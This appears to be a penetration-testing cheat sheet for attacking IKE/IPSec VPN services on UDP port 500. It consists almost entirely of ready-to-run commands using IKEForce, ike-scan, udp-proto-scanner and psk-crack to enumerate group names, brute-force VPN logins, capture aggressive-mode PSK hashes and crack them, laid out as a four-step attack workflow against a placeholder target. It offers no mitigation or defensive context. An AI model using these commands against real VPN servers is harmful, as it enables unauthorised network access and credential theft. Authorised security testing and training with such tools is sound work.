---
description: 'IKE is aprt of IPSec protocol, which is part of VPN''s, it uses UDP port 500'
---

# 500 - IKE \(IPSEC\)

###  IKEFORCE 

Use IKEForce to enumerate or dictionary attack VPN servers. 

Install: 

```text
pip install pyip 
git clone https://github.com/SpiderLabs/ikeforce.git 
 
```

Perform IKE VPN enumeration with IKEForce: 

`./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic`   
 

Bruteforce IKE VPN using IKEForce: 

`./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1` 

### ike-scan 

```text
ike-scan TARGET-IP 
ike-scan -A TARGET-IP 
ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
```

 IKE Aggressive Mode PSK Cracking 

1. Identify VPN Servers 
2. Enumerate with IKEForce to obtain the group ID 
3. Use ike-scan to capture the PSK hash from the IKE endpoint 
4. Use psk-crack to crack the hash 

Step 1: Identify IKE Servers \(uses [https://github.com/portcullislabs/udp-proto-scanner](https://github.com/portcullislabs/udp-proto-scanner)\)

`./udp-protocol-scanner.pl -p ike SUBNET/24` 

Step 2: Enumerate group name with IKEForce 

`./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic` 

Step 3: Use ike-scan to capture the PSK hash 

`ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP` 

Step 4: Use psk-crack to crack the PSK hash 

`psk-crack hash-file.txt` 

Some more advanced psk-crack options below: 

```text
pskcrack 
psk-crack -b 5 TARGET-IPkey 
psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key 
psk-crack -d /path/to/dictionary-file TARGET-IP-key 
```

